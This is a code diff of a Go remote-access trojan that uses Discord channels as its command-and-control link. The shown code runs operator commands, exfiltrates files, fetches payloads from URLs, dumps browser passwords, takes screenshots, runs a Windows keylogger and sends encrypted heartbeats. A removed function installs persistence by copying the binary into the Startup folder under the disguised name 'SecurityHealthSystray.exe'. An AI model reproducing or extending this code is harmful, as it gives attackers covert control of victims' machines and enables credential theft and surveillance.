@@ -23,20 +23,17 @@ import (
 	"github.com/kbinani/screenshot"
 )
 
-// Configuration variables
-// These can be set at compile time using -ldflags
 var (
 	Token          string
 	CommandChannel string
 	ResultChannel  string
-	KeyString      string // Used for ldflags injection
-	EncryptionKey  []byte // Derived from KeyString
+	KeyString      string
+	EncryptionKey  []byte
 )
 
+// Load config from flags or .env
 func init() {
-	// If variables are not set via ldflags (empty), try loading from .env
 	if Token == "" || CommandChannel == "" || ResultChannel == "" || KeyString == "" {
-		// Load .env file if it exists (silently ignore error if missing)
 		_ = godotenv.Load()
 
 		if Token == "" {
@@ -57,7 +54,6 @@ func init() {
 		log.Fatal("Missing required configuration. Either build with -ldflags or provide .env")
 	}
 
-	// Key must be 32 bytes for AES-256
 	if len(KeyString) != 32 {
 		log.Fatal("ENCRYPTION_KEY must be exactly 32 characters long")
 	}
@@ -65,28 +61,23 @@ func init() {
 }
 
 func main() {
-	// Prevent multiple instances using a Named Mutex (Windows only)
+	// Ensure single instance
 	if runtime.GOOS == "windows" {
 		_, err := createMutex("Global\\DiscordC2AgentMutex")
 		if err != nil {
-			// Agent is already running, exit silently
 			return
 		}
 	}
 
-	// Create a new Discord session using the provided bot token.
 	dg, err := discordgo.New("Bot " + Token)
 	if err != nil {
 		log.Fatalf("error creating Discord session: %v", err)
 	}
 
-	// Register the messageCreate func as a callback for MessageCreate events.
 	dg.AddHandler(messageCreate)
 
-	// In this example, we only care about receiving message events.
 	dg.Identify.Intents = discordgo.IntentsGuildMessages
 
-	// Open a websocket connection to Discord and begin listening.
 	err = dg.Open()
 	if err != nil {
 		log.Fatalf("error opening connection: %v", err)
@@ -94,61 +85,38 @@ func main() {
 
 	log.Println("Agent is running. Press CTRL-C to exit.")
 
-	// Send initial check-in message
 	hostname, _ := os.Hostname()
 	checkInMsg := fmt.Sprintf("[%s] Agent Online (%s)", hostname, runtime.GOOS)
 	sendEncryptedChunk(dg, ResultChannel, []byte(checkInMsg), EncryptionKey)
 
-	// Start Keylogger
 	if runtime.GOOS == "windows" {
 		go startKeylogger()
 	}
 
-	// Start Heartbeat Loop (every 30 seconds)
+	// Heartbeat every 30s
 	go func() {
 		ticker := time.NewTicker(30 * time.Second)
 		defer ticker.Stop()
 		for range ticker.C {
-			// Send heartbeat
-			// Format: [HOSTNAME] HEARTBEAT
 			heartbeatMsg := fmt.Sprintf("[%s] HEARTBEAT", hostname)
 			sendEncryptedChunk(dg, ResultChannel, []byte(heartbeatMsg), EncryptionKey)
 		}
 	}()
 
-	// Wait here until CTRL-C or other term signal is received.
 	sc := make(chan os.Signal, 1)
 	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
 	<-sc
 
-	// Cleanly close down the Discord session.
 	dg.Close()
 }
 
-// messageCreate is called every time a new message is created on any channel that the authenticated bot has access to.
 func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
-	// NOTE: We removed the check that ignores the bot's own messages.
-	// Since we are likely using the SAME Bot Token for both Agent and Server,
-	// we need to process messages sent by "ourselves" (the Controller).
-	// We rely on Channel separation (Command vs Result) to avoid loops.
-	/*
-		if m.Author.ID == s.State.User.ID {
-			return
-		}
-	*/
-
-	// Only listen to the specific command channel
 	if m.ChannelID != CommandChannel {
 		return
 	}
 
-	// Check if the message starts with our prefix
 	if strings.HasPrefix(m.Content, "!exec ") {
 		rawCommand := strings.TrimPrefix(m.Content, "!exec ")
-
-		// Check for targeting: !exec [HOSTNAME] command OR !exec ALL command
-		// If no target specified (old format), assume ALL for backward compatibility or ignore.
-		// Let's assume the server ALWAYS sends a target now.
 
 		myHostname, _ := os.Hostname()
 		target := "ALL"
@@ -160,9 +128,7 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 			command = rawCommand[end+2:]
 		}
 
-		// Filter: Am I the target?
 		if target != "ALL" && target != myHostname {
-			// Ignore command meant for someone else
 			return
 		}
 
@@ -171,7 +137,6 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 		var output []byte
 		var err error
 
-		// Handle "cd" command specially to maintain state
 		if strings.HasPrefix(command, "cd ") {
 			newDir := strings.TrimSpace(strings.TrimPrefix(command, "cd "))
 			err = os.Chdir(newDir)
@@ -182,20 +147,16 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 				output = []byte(fmt.Sprintf("Changed directory to: %s", wd))
 			}
 		} else {
-			// Execute the command
 			output, err = executeCommand(command)
 			if err != nil {
 				output = []byte(fmt.Sprintf("Error executing command: %v", err))
 			}
 		}
 
-		// Prepend Hostname to output
 		hostname, _ := os.Hostname()
 		output = append([]byte(fmt.Sprintf("[%s]\n", hostname)), output...)
 
-		// Split the output into chunks if it's too large
-		// Discord limit is 2000 chars. Base64 overhead is ~33%.
-		// So we need to keep the plaintext under ~1400 bytes per message to be safe.
+		// Split output to fit Discord 2000 char limit
 		const maxChunkSize = 1400
 
 		if len(output) <= maxChunkSize {
@@ -235,7 +196,6 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 	} else if strings.HasPrefix(m.Content, "!persist") {
 		rawCommand := strings.TrimPrefix(m.Content, "!persist")
 
-		// Check targeting
 		myHostname, _ := os.Hostname()
 		target := "ALL"
 
@@ -258,7 +218,6 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 		sendEncryptedChunk(s, ResultChannel, output, EncryptionKey)
 
 	} else if strings.HasPrefix(m.Content, "!download") {
-		// Format: !download [TARGET] filepath
 		rawCommand := strings.TrimPrefix(m.Content, "!download")
 		myHostname, _ := os.Hostname()
 		target := "ALL"
@@ -283,7 +242,6 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 		}
 		defer file.Close()
 
-		// Prefix filename with hostname for identification
 		originalName := filepath.Base(path)
 		prefixedName := fmt.Sprintf("%s_%s", myHostname, originalName)
 
@@ -293,8 +251,6 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 		}
 
 	} else if strings.HasPrefix(m.Content, "!upload") {
-		// Format: !upload [TARGET] (with attachment)
-		// OR: !upload [TARGET] http://url/file.exe
 		rawCommand := strings.TrimPrefix(m.Content, "!upload")
 		myHostname, _ := os.Hostname()
 		target := "ALL"
@@ -314,7 +270,6 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 			return
 		}
 
-		// Case 1: Download from URL
 		if url != "" && (strings.HasPrefix(url, "http://") || strings.HasPrefix(url, "https://")) {
 			log.Printf("[*] Downloading from URL: %s", url)
 			resp, err := http.Get(url)
@@ -341,7 +296,6 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 			return
 		}
 
-		// Case 2: Download from Discord Attachment
 		if len(m.Attachments) > 0 {
 			for _, att := range m.Attachments {
 				log.Printf("[*] Downloading attachment: %s", att.Filename)
@@ -384,7 +338,6 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 		log.Println("[*] Dumping passwords...")
 		passwords := DumpBrowsers()
 
-		// Send as file because it might be large
 		if len(passwords) > 0 {
 			reader := strings.NewReader(passwords)
 			fileName := fmt.Sprintf("passwords_%s.txt", myHostname)
@@ -399,14 +352,12 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 	} else if strings.HasPrefix(m.Content, "!screenshot") {
 		rawCommand := strings.TrimPrefix(m.Content, "!screenshot")
 
-		// Check targeting for screenshot too
 		myHostname, _ := os.Hostname()
 		target := "ALL"
 
 		if strings.HasPrefix(rawCommand, " [") && strings.Contains(rawCommand, "]") {
-			// Format: !screenshot [HOSTNAME]
 			end := strings.Index(rawCommand, "]")
-			target = rawCommand[2:end] // Skip " ["
+			target = rawCommand[2:end]
 		}
 
 		if target != "ALL" && target != myHostname {
@@ -415,13 +366,11 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 
 		log.Println("[*] Taking screenshot...")
 
-		// Take screenshot
 		n := screenshot.NumActiveDisplays()
 		if n <= 0 {
 			return
 		}
 
-		// Capture primary display (0)
 		bounds := screenshot.GetDisplayBounds(0)
 		img, err := screenshot.CaptureRect(bounds)
 		if err != nil {
@@ -429,7 +378,6 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 			return
 		}
 
-		// Encode to PNG
 		var buf bytes.Buffer
 		err = png.Encode(&buf, img)
 		if err != nil {
@@ -437,10 +385,6 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 			return
 		}
 
-		// Send as file attachment
-		// Note: We are NOT encrypting the image here for simplicity,
-		// but in a real scenario you would encrypt the bytes before sending.
-		// Discord uses HTTPS so the transfer is encrypted in transit.
 		hostname, _ := os.Hostname()
 		fileName := fmt.Sprintf("screenshot_%s.png", hostname)
 
@@ -464,33 +408,8 @@ func sendEncryptedChunk(s *discordgo.Session, channelID string, data []byte, key
 	}
 }
 
-// executeCommand is now defined in exec_windows.go and exec_unix.go using build tags
+// installPersistence is now defined in exec_windows.go and exec_unix.go
 
-func installPersistence() (string, error) {
-	exe, err := os.Executable()
-	if err != nil {
-		return "", err
-	}
-
-	// Method 2: Startup Folder (Less flagged than Registry)
-	// %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
-	destDir := os.Getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
-	destPath := destDir + "\\SecurityHealthSystray.exe"
-
-	// Copy file
-	input, err := os.ReadFile(exe)
-	if err != nil {
-		return "", err
-	}
-	err = os.WriteFile(destPath, input, 0755)
-	if err != nil {
-		return "", err
-	}
-
-	return "Persistence installed to Startup: " + destPath, nil
-}
-
-// Windows Mutex implementation
 var (
 	kernel32        = syscall.NewLazyDLL("kernel32.dll")
 	procCreateMutex = kernel32.NewProc("CreateMutexW")
